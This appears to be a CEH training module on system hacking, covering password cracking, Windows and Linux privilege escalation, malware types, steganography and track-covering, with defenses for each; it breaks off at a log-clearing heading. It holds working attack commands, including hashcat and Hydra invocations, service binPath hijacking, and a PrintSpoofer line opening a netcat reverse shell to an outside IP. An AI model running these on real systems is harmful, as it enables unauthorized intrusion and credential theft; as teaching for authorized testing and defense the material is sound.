🎯 Module Overview

What system hacking actually is

System hacking is the phase of an attack where reconnaissance turns into control. Everything before it — footprinting, scanning, enumeration — is preparation: the attacker has mapped the target, identified live hosts and open services, and gathered usernames, shares, and version numbers. None of that, by itself, compromises anything. System hacking is where that intelligence is used to actually break in, take control, and stay hidden. In the CEH framework it is the hinge of the entire attack lifecycle, and it is where the largest number of distinct techniques converge.

It helps to think of system hacking as answering four questions in sequence. How do I get in? — gaining access, usually by defeating authentication through password attacks. How do I get more power once I am in? — privilege escalation, covered in its own section. How do I make my access durable and useful? — executing applications like keyloggers, spyware, and backdoors that let the attacker act and persist. How do I avoid getting caught? — hiding files with techniques like steganography, and covering tracks by tampering with the logs that would reveal the intrusion. Each question maps to a section of this module.

Understanding this phase matters just as much for defenders as for attackers, and that symmetry is a theme you will see throughout. Every technique here has a corresponding detection or mitigation, and the same tools an attacker uses to find a weakness are the tools a defender uses to find it first. A penetration tester who understands system hacking can demonstrate real business risk; a blue-team analyst who understands it knows what the attacker's footprints look like in the logs.

The CEH system-hacking methodology

EC-Council structures this phase as a five-stage methodology. The stages are not rigid — a real intrusion loops back and forth between them — but the model is a useful map, and the exam expects you to know it in order.

Gaining access is about crossing the authentication boundary — cracking a password, replaying a captured credential, or exploiting a service that authenticates the attacker as a legitimate user. Escalating privileges takes the limited foothold that access usually provides and turns it into full administrative control, because most of what an attacker wants is gated behind admin or SYSTEM rights. Executing applications is where the attacker installs the tooling that makes the compromise productive — software to capture keystrokes, exfiltrate data, or provide a reliable way back in. Hiding files conceals that tooling from users and investigators. Covering tracks removes or corrupts the evidence — event logs, command history, timestamps — that a responder would use to reconstruct what happened.

Learning objectives

By the end of this module you should be able to explain and, in an authorized lab, demonstrate each of the following:

  • How the major password attacks work — dictionary, brute force, and the offline cracking of dumped hashes — and why hash type dictates the entire approach.
  • Why privilege escalation is an enumeration problem, and the standard Windows and Linux escalation vectors.
  • How keyloggers, spyware, rootkits, and backdoors differ, and where each sits in an attacker's toolkit.
  • How steganography conceals data inside ordinary files, and why it is difficult to detect.
  • How attackers cover their tracks on Windows and Linux, and — critically — what traces they leave behind anyway.
  • For every technique above, the detection and mitigation a defender would apply.

Ethical and legal boundary. Every technique in this module is a felony when performed against systems you do not own or have explicit written authorization to test. The skills are taught so that you can defend systems and conduct authorized assessments under a signed scope agreement. "I was just learning" is not a legal defense. Throughout this module, the offensive detail is always paired with the defensive response, because the point of understanding an attack is to be able to stop it.

📋 System Hacking Methodology

Why a methodology matters

An attacker who improvises tends to make noise, miss opportunities, and leave evidence. A methodology imposes discipline: it ensures that access is consolidated before it is used, that privileges are escalated before high-value actions are attempted, and that tracks are covered last, after everything else is done. For a penetration tester, following the methodology also makes the work repeatable and reportable — you can show a client exactly which stage succeeded and where their defenses held. The five stages below are the CEH model, and each subsequent section of this module drills into one of them.

The five phases in depth

Phase 1 — Gaining access

The goal is to cross an authentication boundary and obtain a working session on the target. The most common route is against passwords — guessing weak ones online, or cracking dumped hashes offline — but this phase also includes exploiting a vulnerable service that hands the attacker a session directly, or replaying a credential captured on the network. The output of this phase is a foothold: a shell or session, usually running with limited privileges.

Phase 2 — Escalating privileges

The foothold from Phase 1 is rarely privileged enough to do real damage. Escalation turns a standard user into a local administrator, or a constrained service account into SYSTEM or root. Escalation comes in two directions: vertical (upward, crossing the user/admin boundary) and horizontal (sideways, to another account at the same level — often as a stepping stone to an account that can escalate vertically). This is treated fully in the Privilege Escalation section.

Phase 3 — Executing applications

With sufficient privilege, the attacker installs the tooling that makes the compromise productive and durable: keyloggers to capture credentials, spyware to exfiltrate data, backdoors to guarantee re-entry, and remote-access trojans to control the host. This is the stage where a transient intrusion becomes a persistent one.

Phase 4 — Hiding files

The tooling from Phase 3 has to be concealed from users, administrators, and forensic investigators. Techniques range from simple (hidden attributes, alternate data streams on NTFS) to sophisticated (steganography, which embeds data inside innocuous image or audio files, and rootkits, which hide files and processes at the operating-system level).

Phase 5 — Covering tracks

Finally, the attacker removes or corrupts the evidence of everything above — clearing event logs, deleting command history, manipulating file timestamps, and disabling the auditing that would record their activity. This phase is last because it destroys the very trail the attacker was creating throughout the previous phases. It is also, for defenders, one of the richest sources of detection: the act of clearing logs is itself a loud, logged event.

Vertical vs. horizontal escalation

Because the two directions of escalation are a recurring exam point, it is worth fixing the distinction now with concrete examples.

↗️ Vertical (privilege elevation)

Crossing a trust boundary upward. A standard domain user becomes a Domain Admin; a web-server service account becomes SYSTEM. This is the higher-impact direction and what most escalation tooling targets.

↔️ Horizontal

Moving sideways to another account at the same privilege level — reading a peer's files or mailbox without becoming an administrator. Easy to overlook because no "administrator" alarm fires, yet frequently the path to an account that can then escalate vertically.

🔐 Password Attacks

Why passwords remain the front door

Despite decades of predictions of their demise, passwords are still the primary authentication mechanism on most systems, and defeating them is still the most common way attackers gain access. Password attacks divide into two fundamentally different situations, and confusing them is a common beginner mistake. In an online attack, the attacker submits guesses to a live system — trying to log in over SSH, RDP, or a web form. In an offline attack, the attacker has already obtained the password hashes (from a dumped database, a SAM file, or a captured authentication exchange) and cracks them on their own hardware, with no interaction with the target at all.

The distinction matters because it dictates everything about the attack. Online attacks are slow and loud: every attempt hits the target, generates a log entry, and risks triggering an account lockout after a few failures. Offline attacks are fast and silent: once the attacker has the hashes, they can make billions of guesses per second on a GPU without the target ever knowing. This is why dumping a hash database is such a prized objective — it converts a slow, detectable problem into a fast, invisible one.

The attack categories

CEH organizes password attacks into four categories by the mechanism they use. In practice a real engagement blends them.

📖 Dictionary attacks

Guessing from a list of likely passwords rather than trying every combination. Because humans overwhelmingly choose memorable passwords, a good wordlist — rockyou.txt being the canonical example, drawn from a real breach — cracks a large fraction of real passwords quickly. Enhanced with rules that mutate each word (capitalize, append 123, apply leetspeak substitutions), a dictionary attack captures the predictable ways people complicate simple passwords.

💪 Brute force

Trying every possible combination within a character set and length. Guaranteed to succeed eventually, but the search space grows exponentially with length, so brute force is only practical against short passwords or fast (unsalted) hashes. In modern tooling this is a mask attack, which brute-forces a known pattern (e.g. "one uppercase, five lowercase, two digits") rather than blindly, dramatically shrinking the space.

🌈 Rainbow tables

Precomputed tables that trade disk space for cracking time by storing chains of hash computations. Devastatingly effective against unsalted hashes like raw NTLM or MD5. Their relevance has faded as GPU cracking became fast enough to brute-force those same hashes directly, and because any properly salted hash defeats them entirely — but they remain a valid concept and an exam topic.

🕵️ Passive / network attacks

Capturing credentials in transit rather than guessing them — sniffing, man-in-the-middle, and replay. On Windows networks, a tool like Responder poisons name-resolution requests to capture NetNTLMv2 authentication exchanges, which are then cracked offline. Password spraying (one common password against many accounts) also lives here, because it evades lockout by never hitting one account repeatedly.

Hash type dictates everything

The single most important concept in offline cracking is that the hashing algorithm determines whether cracking is trivial or effectively impossible. A hash is one-way: cracking does not "reverse" it, but rather computes the hash of each candidate password and compares. The speed of that computation is the whole game.

Fast hashes — NTLM, MD5, unsalted SHA-1 — have no salt and no deliberate slowdown. A modern GPU computes tens to hundreds of billions of them per second, so weak passwords fall in seconds and even moderately complex ones fall in hours. Slow hashes — bcrypt, scrypt, Argon2 — are intentionally expensive, with a tunable cost factor that can push a single guess to milliseconds of compute. That cost asymmetry is the entire reason slow hashes exist: it barely inconveniences a legitimate login but multiplies an attacker's cracking time by orders of magnitude. A bcrypt hash with a high cost factor can take weeks per password where an NTLM hash of the same password takes seconds.

Why this is the practical takeaway: before spending GPU time, an attacker identifies the hash type, because it decides whether to even try. This is also the defender's most powerful lever — storing passwords with bcrypt or Argon2 rather than a fast hash turns a five-minute crack into an impractical one, with no change to the user experience.

The tools in practice

Three tools dominate, and knowing which to reach for is part of the skill.

John the Ripper

CPU-based, auto-detects many formats, excellent for quick jobs and mixed hash files. The unshadow utility combines Linux /etc/passwd and /etc/shadow into a crackable file.

A representative offline workflow: dump NTLM hashes from a compromised host, identify the type, then run Hashcat in dictionary-plus-rules mode — the highest-yield attack against human-chosen passwords — before falling back to mask attacks for structured ones.

# Dictionary attack against NTLM hashes (mode 1000), with the best64 rule set hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule # Online dictionary attack against SSH with Hydra hydra -l admin -P wordlist.txt ssh://192.168.1.10 # Show what has been cracked so far hashcat -m 1000 hashes.txt --show

Credential dumping: where the hashes come from

Offline cracking presupposes that the attacker has hashes to crack, and obtaining them is a step in its own right. On Windows, hashes live in the SAM database (local accounts) and, on domain controllers, in NTDS.dit (all domain accounts). The classic tool Mimikatz reads credentials — including plaintext, hashes, and Kerberos tickets — directly out of the lsass.exe process memory, which requires the SeDebugPrivilege discussed in the escalation section. The Impacket tool secretsdump extracts them over the network given administrative credentials.

This is the point where the password-attacks and privilege-escalation sections meet: you generally need elevated privileges to dump the hashes, and you dump the hashes to crack passwords that grant access to other systems. Password reuse makes this devastating — a single cracked hash often unlocks many machines.

Defense: how to make cracking impractical

The defenses against password attacks are well understood and, applied together, decisive:

  • Store passwords with a slow, salted hash (bcrypt, scrypt, Argon2). This single choice turns fast offline cracking into an impractical one and defeats rainbow tables entirely.
  • Enforce length over complexity. A long passphrase defeats brute force far more effectively than mandated symbols, which mostly produce predictable substitutions a rule-based dictionary attack anticipates.
  • Require multi-factor authentication. Even a cracked password is useless without the second factor — this is the highest-value single control against credential attacks.
  • Set a lockout policy low enough to stop online guessing but not so low that spraying trivially locks out the whole organization.
  • On Windows, enable Credential Guard, which isolates LSASS and blocks Mimikatz-style memory dumping, and disable NTLM where possible.
  • Monitor for the signatures of these attacks — repeated authentication failures, secretsdump traffic, and Responder's poisoned responses on the network.

⬆️ Privilege Escalation

Why escalation is the pivot point of an attack

Initial access rarely lands an attacker where they want to be. A phishing payload runs as the user who opened it; a web shell runs as the low-privilege account the web server uses; a compromised service runs with whatever rights that service was assigned. From any of these footholds the attacker can see only a sliver of the system. Privilege escalation is the process of turning that sliver into full control — moving from an ordinary user to a local administrator, or from a constrained service account to NT AUTHORITY\SYSTEM on Windows or root on Linux.

This step matters more than any other in the system-hacking chain, because almost everything valuable is gated behind it. Dumping the credential store, installing a kernel-level rootkit, disabling security tooling, clearing the logs that would reveal the intrusion, reading other users' files — each requires privileges the initial foothold does not have. An attacker who cannot escalate is stuck with a noisy, limited, easily-evicted presence. An attacker who can escalate owns the machine and, frequently, a path to the rest of the network.

Escalation divides into two directions, and the distinction shapes how you both attack and defend. Vertical escalation (also called privilege elevation) moves upward across a trust boundary — a standard user becoming an administrator. This is what most people mean by "privesc," and it is what the techniques below target. Horizontal escalation moves sideways to another account at the same privilege level — reading a colleague's mailbox, accessing another user's home directory — without crossing the user/admin boundary at all. Horizontal moves are easy to overlook precisely because no alarm about "administrator" fires, yet they are often how an attacker reaches the one account that can escalate vertically.

The first move: enumerate before you exploit

Escalation is fundamentally an information problem. The vulnerability that grants SYSTEM is almost always already present on the host — a misconfigured service, an over-permissioned token, an unpatched kernel — and the attacker's job is to find it, not create it. This is why experienced operators spend far more time enumerating than exploiting. On Windows, a single command does most of the initial work:

whoami /priv

This lists the privileges held by the current token. A handful of these are direct paths to SYSTEM if present and enabled, and recognizing them on sight is a core exam and job skill:

SeImpersonatePrivilege — permits impersonating a client after authentication. Held by default by service accounts (LOCAL SERVICE, NETWORK SERVICE) and by IIS APPPOOL identities, which is why compromising a web application so often leads straight to SYSTEM. This is the single most commonly abused privilege on modern Windows.

SeAssignPrimaryTokenPrivilege — allows replacing a process's primary token, achieving the same end as SeImpersonate through a slightly different mechanism.

SeBackupPrivilege / SeRestorePrivilege — grant read (or write) access to any file regardless of its ACL, ostensibly for backup software. In practice this means reading the SAM and SYSTEM registry hives to extract password hashes offline.

SeDebugPrivilege — allows opening any process, including those owned by SYSTEM, and is the key that lets tools like Mimikatz read credentials out of lsass.exe memory.

SeTakeOwnershipPrivilege — lets the holder seize ownership of any securable object, then rewrite its ACL to grant themselves access.

The Linux equivalent is a matching enumeration reflex. Rather than a single privilege list, the attacker inventories the standard escalation surfaces: files that run with elevated rights (SUID/SGID binaries), commands the current user may run as another user (sudo -l), scheduled jobs that execute as root (cron), writable service or configuration files, and the kernel version against known local exploits.

# Windows: dump privileges, group memberships, and patch level whoami /all systeminfo # Linux: the four classic escalation surfaces sudo -l # what may I run as another user? find / -perm -4000 -type f 2>/dev/null # SUID binaries cat /etc/crontab; ls -la /etc/cron.* # scheduled jobs running as root uname -a # kernel version -> exploit-suggester

Because this enumeration is mechanical and error-prone by hand, it is almost always automated. On Windows, WinPEAS and PowerUp (Invoke-AllChecks) walk the entire surface and flag likely wins; on Linux, LinPEAS, LinEnum, and linux-exploit-suggester do the same. Understanding what these tools check — and why each check matters — is more valuable than memorizing their flags, because the underlying misconfigurations are the actual exam content.

Windows technique 1 — Token impersonation and the "Potato" family

When enumeration reveals SeImpersonatePrivilege, the standard escalation is a token-impersonation attack. The mechanism is worth understanding rather than memorizing: Windows lets a privileged service impersonate a connecting client so it can act on that client's behalf. The Potato exploits abuse this by tricking a SYSTEM-level service into authenticating to an attacker-controlled endpoint, capturing the resulting SYSTEM token, and impersonating it. The low-privilege account never gains new rights directly; it borrows SYSTEM's identity for long enough to launch a SYSTEM process.

The important practical detail — and a favorite exam point — is that the specific tool depends on the Windows version, because Microsoft has repeatedly patched the underlying trick:

JuicyPotato
Windows ≤ 1803, Server 2016
→ patched →
RoguePotato / PrintSpoofer
Windows 1809+, Server 2019
→ evolved →
GodPotato / DCOMPotato
modern Windows 10/11, Server 2022

JuicyPotato was the classic tool, but Microsoft closed its DCOM-based trigger in Windows 10 build 1809 and Server 2019. On those and newer systems, PrintSpoofer (which abuses the Print Spooler's named-pipe behavior) and RoguePotato took over, and GodPotato extended the approach to the latest builds. An attacker who reaches for JuicyPotato on Server 2022 and reports "privesc failed" has simply used the wrong tool for the version — the privilege is still exploitable.

# SeImpersonatePrivilege confirmed via whoami /priv, on Windows 10 1809+ # PrintSpoofer: spawn an interactive SYSTEM shell in the current console PrintSpoofer.exe -i -c cmd.exe # Or execute a single command as SYSTEM (e.g. a reverse shell) PrintSpoofer.exe -c "nc.exe 10.10.14.3 8443 -e cmd.exe"

Detection and defense. These attacks are noisy if you are watching for them. They spawn a child process (usually cmd.exe or a shell) whose parent is a service process, and the new process runs as SYSTEM while its ancestry traces back to a service account — an anomalous parent/child privilege jump that EDR products flag. Defensively, the strongest control is to avoid granting SeImpersonatePrivilege to accounts that run attacker-reachable code, keep systems patched so the version-specific triggers stay closed, and disable the Print Spooler service on hosts that do not need it.

Windows technique 2 — Service misconfigurations

Windows services run with high privilege, frequently as SYSTEM, and they are configured by administrators who make mistakes. Three recurring misconfigurations turn a service into an escalation path, and each has a distinct signature you can enumerate for.

Unquoted service paths. When a service's executable path contains spaces and is not wrapped in quotes — for example C:\Program Files\My App\service.exe — Windows resolves it ambiguously, trying C:\Program.exe, then C:\Program Files\My.exe, and so on before reaching the intended binary. If the attacker can write to one of those earlier locations, their malicious executable runs with the service's privileges at next start. The surface has narrowed over the years as software vendors fixed their installers, but it still appears on real corporate hosts.

Weak service binary permissions. If the account can overwrite the service's executable file directly, they simply replace it and wait for (or trigger) a restart. Enumeration tools flag any service whose binary is writable by a non-administrator.

Weak service configuration permissions. If the account can reconfigure the service itself — change which binary it runs (binPath) — no file-writing is even needed; they point the service at their own command.

# Inspect a service's configuration for an unquoted path or hijackable binary sc qc "VulnerableService" # If binPath is reconfigurable, point it at your own command and restart sc config "VulnerableService" binPath= "C:\temp\evil.exe" sc stop "VulnerableService" & sc start "VulnerableService"

Defense. Quote all service paths, install applications only to directories that non-administrators cannot write to (the default C:\Program Files ACLs are safe; custom locations often are not), and audit service binary and configuration permissions. PowerUp's Invoke-AllChecks reports every one of these conditions, which makes it as useful to defenders auditing their own hosts as to attackers.

Windows technique 3 — UAC bypass and DLL hijacking

User Account Control (UAC) is the boundary that forces even administrator accounts to explicitly approve elevation via the familiar consent prompt. An attacker who has compromised an administrator account is still, thanks to UAC, running in a medium-integrity context and cannot yet perform administrative actions silently. A UAC bypass crosses that last gap without triggering the prompt.

The common pattern abuses Windows' own auto-elevating binaries — trusted Microsoft programs that Windows allows to elevate without a prompt. The attacker manipulates a registry key or file that the auto-elevating program reads under the current user's control (HKCU), then launches it; the program elevates automatically and executes the attacker's payload with it. The fodhelper.exe and eventvwr.exe bypasses are textbook examples, and the UACMe project catalogs dozens of working methods. Microsoft has historically declined to treat UAC bypasses as security boundaries, so new ones continue to appear.

DLL hijacking (also called DLL search-order hijacking) is a related and versatile technique. When a program loads a library by name rather than by full path, Windows searches a defined sequence of directories to find it. If the attacker can place a malicious DLL with the expected name in a directory that is searched before the legitimate one — and that they can write to — their code loads into the target process, inheriting its privileges. This underlies both privilege escalation (hijacking a DLL loaded by a SYSTEM service) and persistence (hijacking one loaded by a program the user runs regularly).

Finding a hijackable DLL: run Process Monitor (procmon) while the target program starts, filter for CreateFile operations on .dll files that return NAME NOT FOUND, and check whether any of those searched paths are writable. Each missing DLL in a writable location is a candidate.

Defense. Set UAC to its highest level (always notify), which closes many of the silent-elevation tricks; keep systems patched; and, against DLL hijacking, ensure applications load libraries by absolute path and that their installation directories are not writable by standard users.

Windows technique 4 — Kernel exploits

When configuration-based paths are exhausted, an unpatched kernel vulnerability offers a direct route: a flaw in a kernel-mode driver or the Windows kernel itself lets a user-mode process execute code in kernel context, which is by definition SYSTEM-equivalent. Historically significant examples include MS16-032 (the secondary-logon handle flaw referenced in the Metasploit lab below) and the various PrintNightmare spooler vulnerabilities.

Kernel exploits are powerful but carry real risk: a failed or unstable exploit can crash the target (a bugcheck / blue screen), which is both operationally disruptive and extremely noisy. Experienced operators treat them as a last resort, after configuration-based escalation has been ruled out, precisely because the configuration paths are quieter and more reliable. The defense is unglamorous but decisive — patch management. A fully-patched host simply does not have the vulnerable driver, and the exploit fails.

Linux privilege escalation

The Linux escalation surface is organized around the same principle — find the thing already misconfigured — but the specific vectors differ. Four dominate in both exams and real assessments.

SUID/SGID binaries

A binary with the SUID bit runs with the privileges of its owner (often root) regardless of who executes it. This is legitimate for tools like passwd, but a SUID binary that can be coerced into running arbitrary commands — or a non-standard SUID binary left by an administrator — becomes a root shell. The site GTFOBins catalogs exactly which common binaries can be abused this way and how.

find / -perm -4000 -type f 2>/dev/null

Sudo misconfigurations

sudo -l reveals which commands the current user may run as root. If any of them can spawn a shell, read/write arbitrary files, or execute other programs (again, see GTFOBins), that entry is a direct escalation. Even sudo vim or sudo find is enough.

sudo -l # e.g. "(root) NOPASSWD: /usr/bin/find" -> root shell via find's -exec

Cron jobs

Scheduled tasks that run as root and execute a script the attacker can modify — or that rely on a writable directory in their PATH — run the attacker's code as root on the next tick. Look for world-writable scripts referenced by root's crontab.

cat /etc/crontab ls -la /etc/cron.*

Kernel exploits

As on Windows, an unpatched kernel is a direct route — Dirty COW and its successors are the well-known examples. uname -a gives the version; linux-exploit-suggester matches it against known local exploits. Same trade-off applies: powerful, but riskier and noisier than a configuration win.

uname -a ./linux-exploit-suggester.sh

The enumeration tools that automate this — LinPEAS, LinEnum, BeRoot, and linux-exploit-suggester — each walk these surfaces and highlight likely wins. As with their Windows counterparts, the value for a student is in understanding what they flag and why each finding is exploitable, because that understanding is what the exam tests and what real assessment work requires.

Key takeaways

  • Escalation is an information problem: the weakness is usually already on the host, and enumeration — not exploitation — is where the work is.
  • On Windows, whoami /priv is the first move; SeImpersonatePrivilege is the most commonly abused right and leads to SYSTEM via the version-appropriate Potato tool.
  • Tool choice depends on OS version — JuicyPotato for older builds, PrintSpoofer/RoguePotato/GodPotato for 1809 and newer. A "failed" escalation is often just the wrong tool for the version.
  • Service misconfigurations (unquoted paths, weak binary/config permissions) and UAC bypasses are quieter and more reliable than kernel exploits, which are a noisy last resort.
  • On Linux, the big four are SUID/SGID binaries, sudo rules, cron jobs, and kernel exploits — GTFOBins is the reference for abusing the first two.
  • Nearly every defense reduces to the same three disciplines: least privilege (don't grant powerful tokens to reachable accounts), patch management (closes kernel and version-specific paths), and configuration auditing (the same tools attackers run will show defenders their exposure).

⚡ Executing Applications

Turning access into a productive foothold

Once an attacker has gained access and escalated privileges, a transient shell is not yet an objective achieved. The "executing applications" phase is where they install the tooling that makes the compromise useful and durable: software to capture what the user types, exfiltrate their data, and — most importantly — guarantee a way back in even if the original entry point is closed. This is the stage where an intrusion becomes an infestation. The four categories below are distinct in purpose, and CEH expects you to tell them apart cleanly, but real-world implants routinely combine several: a modern remote-access trojan may bundle a keylogger, a rootkit to hide itself, and a backdoor for persistence in one package.

Keyloggers

A keylogger records every keystroke a user types, capturing passwords, messages, and any other typed data at the moment of entry — before encryption, before hashing, in the clear. That "before encryption" point is what makes them so valuable: a keylogger sidesteps every cryptographic protection a system has by catching the secret as the human types it. They come in two families with very different detection profiles.

💻 Software keyloggers

Programs that intercept keystrokes at some level of the operating system. A user-mode keylogger uses a documented API such as Windows' SetWindowsHookEx to hook the keyboard event chain — easy to build, but visible to security tooling. A kernel-mode keylogger runs as a driver and intercepts input far lower in the stack, which is stealthier but harder to write and requires the privilege to load a driver. A form-grabber variant hooks the browser specifically, capturing web form submissions before TLS encrypts them.

🔌 Hardware keyloggers

A physical device inserted between the keyboard and the computer, storing keystrokes in internal memory for later retrieval. Because they are entirely external to the operating system, no software-based detection can see them — antivirus, EDR, and integrity checkers are all blind to a device on the wire. The only defense is physical: inspecting ports on high-security machines. They require physical access to install, which limits them to insider or targeted scenarios.

Detection and defense. Software keyloggers exhibit behavioral indicators — a process hooking the keyboard, then periodically writing to a file or making network connections to exfiltrate the log — that EDR products and network monitoring can catch. Multi-factor authentication blunts their primary payoff, since a captured password alone is insufficient. Hardware keyloggers require physical inspection, which is why sensitive environments control physical access to endpoints.

Spyware

Spyware is a broader category of software that covertly gathers information about a user or organization and relays it to the attacker. Where a keylogger is narrowly focused on keystrokes, spyware may capture screenshots, harvest browser history and stored credentials, record audio or video, track location, and inventory files. The defining characteristic is stealthy exfiltration — it is designed to collect and transmit without the victim's awareness, often for months. Modern infostealers, a prominent spyware subtype, specialize in scraping saved passwords, session cookies, and cryptocurrency wallets, and have become a major driver of account-takeover attacks. The defensive posture mirrors keyloggers: behavioral detection of the collection-and-exfiltration pattern, plus network monitoring for the data leaving.

Backdoors and remote-access trojans

A backdoor is any mechanism that provides covert, reliable re-entry to a compromised system, bypassing normal authentication. Its purpose is persistence: even if the defender patches the original vulnerability or resets the cracked password, the backdoor lets the attacker return. Backdoors range from crude (a hidden administrator account, a scheduled task that phones home) to sophisticated (a modified system binary, a malicious kernel module). On Linux, the Quasar/QLNX implant family illustrates the modern approach — a PAM backdoor that subverts the authentication module itself, so the attacker can log in as any user with a magic password while legitimate authentication continues to work normally.

A remote-access trojan (RAT) is a backdoor with a full remote-control capability attached — file transfer, command execution, screen viewing, webcam and microphone access, all driven from the attacker's console. RATs are the Swiss-army implant of post-exploitation, and they frequently bundle keylogging, credential harvesting, and rootkit concealment. The distinction the exam wants: a backdoor guarantees access; a RAT guarantees access plus interactive control.

Persistence is where defenders get a second chance. Establishing persistence almost always leaves an artifact — a new service, a scheduled task, a registry Run key, a modified ld.so.preload, an added SSH key. These persistence locations are finite and well-catalogued (MITRE ATT&CK's Persistence tactic enumerates them), which is exactly why hunting for unexpected entries in them is one of the highest-yield defensive activities.

Rootkits: hiding the whole operation

A rootkit is the concealment layer that hides the keyloggers, spyware, and backdoors above from users, administrators, and security tools. It is not itself an entry vector — it is post-exploitation malware whose entire job is stealth and persistence. Rootkits are classified by the privilege level at which they operate, and the level determines both their power and how hard they are to find.

User-mode rootkits

Operate at the same level as ordinary programs, hooking API calls in memory to hide files and processes belonging to the attacker. Easier to deploy, but because they live in userspace, kernel-level security tools and EDR can detect them relatively reliably.

Kernel-mode rootkits

Run as a driver inside the OS kernel, hooking or patching system calls at the deepest software level. Far more powerful and far harder to detect — a rootkit at this level can lie to any security tool that asks the OS a question, because it is the part of the OS answering. Detecting them reliably requires looking from outside the compromised OS.

Beyond these two, more insidious variants exist — bootkits that load before the OS by infecting the boot record, and firmware/hardware rootkits that survive even an OS reinstall. On Linux, a common technique is LD_PRELOAD / ld.so.preload hijacking, which forces every program to load a malicious library that intercepts standard C-library functions.

Detecting what is designed to be invisible

The defining challenge of this whole category is that a sufficiently privileged rootkit can subvert any detection that trusts the operating system, because it controls the operating system's answers. This shapes how defenders approach it:

  • Cross-view / offline analysis. Compare what the live OS reports against ground truth gathered another way — booting from clean external media, or reading raw disk and memory — so a lying kernel cannot hide the discrepancy.
  • Memory forensics. Rootkits must exist in memory to run; dumping and analyzing RAM can reveal hooks and hidden processes the live OS conceals.
  • Boot and firmware integrity. Secure Boot and measured-boot mechanisms defend the layers below the OS where bootkits and firmware rootkits hide.
  • Behavioral EDR. Even a stealthy implant eventually does something — makes a network connection, spawns a process, writes a file — and behavior-based detection catches the action even when the artifact is hidden.
  • Least privilege and driver signing. Kernel rootkits require the ability to load a driver; enforcing driver signing and denying that privilege closes the door on the most dangerous class.

The practical lesson: prevention (least privilege, patching, driver-signing enforcement) is far cheaper than detection once a kernel rootkit is installed. The strongest response to a confirmed kernel-level compromise is often to rebuild the host from known-good media rather than attempt cleaning, because you can never fully trust a system whose kernel has been subverted.

🖼️ Steganography & Data Hiding

Hiding in plain sight

Cryptography and steganography solve different problems and are often confused. Cryptography scrambles a message so that anyone who intercepts it cannot read it — but they can see that something encrypted exists, which is itself information. Steganography hides the very existence of the message, concealing it inside something ordinary and unremarkable so that no observer suspects there is anything to look for. An encrypted file screams "secret"; a steganographic payload looks like a vacation photo. In an attack, the two are frequently combined: encrypt the data first, then hide the ciphertext, so that even if the hiding is discovered the content is still protected.

For an attacker, steganography serves two goals in the system-hacking phase. It conceals tooling on disk — a payload embedded in an image file survives a casual review that would flag a suspicious executable. And it enables covert exfiltration — stealing data by hiding it inside innocuous files (images posted to a social account, audio uploaded to a sharing site) that sail past data-loss-prevention systems watching for obvious secrets leaving the network.

How it works: the least-significant-bit technique

The most common and most teachable method is least significant bit (LSB) substitution, and understanding it demystifies the whole field. A digital image stores each pixel as color values — for example, three bytes for red, green, and blue. The least significant bit of each byte contributes almost nothing to the color a human perceives: flipping it changes a red value from 200 to 201, a difference no eye can detect. Steganography exploits this slack. By replacing the least significant bit of each color byte with one bit of the hidden message, an attacker can embed a substantial payload — the image looks identical, but its lowest bits now spell out the secret.

The capacity trade-off: a 1920×1080 image has about two million pixels, each with three color bytes, giving roughly six million bits — about 750 KB — of hiding capacity using just one bit per byte, with no visible change. Using more bits per byte increases capacity but eventually produces visible artifacts, which is one of the signatures detection tools look for.

The same principle extends beyond images. The carrier just needs redundant, low-perceptibility data to borrow.

Carriers: what can hide a payload

🖼️ Image steganography

The classic carrier. LSB substitution in the color channels of PNG or BMP files (lossless formats preserve the hidden bits; JPEG's compression can destroy them, requiring frequency-domain techniques instead). High capacity, visually undetectable to humans.

🎵 Audio steganography

Hides data in the least significant bits of audio samples, or in frequencies outside human hearing, or by exploiting the ear's inability to perceive a quiet tone immediately after a loud one (echo hiding). WAV files are the common lossless carrier.

🎬 Video steganography

Combines image and audio techniques across many frames, offering enormous capacity — a video has thousands of images to hide within. Useful for exfiltrating large datasets inside a single innocuous-looking file.

📝 Text & other carriers

Lower capacity but subtle: manipulating whitespace, word choice, or formatting to encode bits. Also includes NTFS alternate data streams, which let a file secretly carry a second hidden file on Windows — a favorite for concealing payloads.

Tools

A range of tools implement these techniques, from command-line utilities to full applications. Steghide embeds and extracts data in image and audio files with optional passphrase encryption. OpenStego and older tools like Snow (whitespace-based text steganography) and ImageHide serve similar roles. On Windows, alternate data streams need no special tool at all — the OS itself creates them with a simple type payload.exe > innocent.txt:hidden.exe style redirection. Knowing the tools by name is an exam expectation; understanding that they all rest on the same "borrow imperceptible slack in a carrier" principle is the durable knowledge.

Steganalysis: detecting the hidden

Detecting steganography — steganalysis — is genuinely hard, which is precisely why attackers value the technique. Because a well-made steganographic file looks normal, detection relies on statistical and comparative methods rather than simple inspection:

  • Statistical analysis. Embedding data disturbs the natural statistical distribution of a file's bits. LSB substitution, for instance, makes the least significant bits more random than they would naturally be. Tools like StegExpose flag these anomalies.
  • Known-carrier comparison. If the original, unmodified file is available, comparing it byte-for-byte against the suspect file reveals the changes immediately. This is why attackers use unique, self-generated carriers rather than well-known images.
  • Signature detection. Specific tools leave specific artifacts — headers, structural patterns — that can be fingerprinted.
  • Anomaly heuristics. An image file that is unexpectedly large for its dimensions, or one whose file type does not match its extension, invites scrutiny.

Defense in practice. Because reliable detection is difficult, organizations lean on prevention and disruption. Data-loss-prevention systems monitor for large or unusual outbound files. Critically, re-encoding a file destroys most steganographic payloads — a gateway that resizes or recompresses every uploaded image will silently obliterate LSB-hidden data without needing to detect it first. This "sanitize rather than detect" approach is often the most practical defense.

🕵️ Covering Tracks

The final phase — and why it is the loudest

Covering tracks is the attacker's attempt to erase the evidence of everything they have done: the logs that recorded their logins, the command history that captured their actions, the timestamps that would place them at the scene, and the security events that flagged their tools. It comes last in the methodology because it destroys the very trail the attacker has been generating throughout the intrusion. A successful cleanup can turn a detectable breach into an invisible one, delaying discovery for months and crippling any eventual investigation.

Yet there is a deep irony that defenders exploit: the act of covering tracks is itself an event that gets logged. Clearing a Windows event log generates Event ID 1102 ("the audit log was cleared"). Truncating a Linux log leaves a suspicious gap. Deleting command history is visible to a shell configured to log to a remote server. The attacker is trying to erase a record while standing inside the recording system — and unless they also control where the records are sent, their erasure is recorded too. This is why forwarding logs off-host to a SIEM, in real time, is one of the most powerful defensive controls in existence: it takes the evidence out of the attacker's reach the instant it is created.

What attackers target

Cleanup focuses on four kinds of evidence, and the concepts are the same across operating systems even though the mechanics differ.

📋 Log clearing

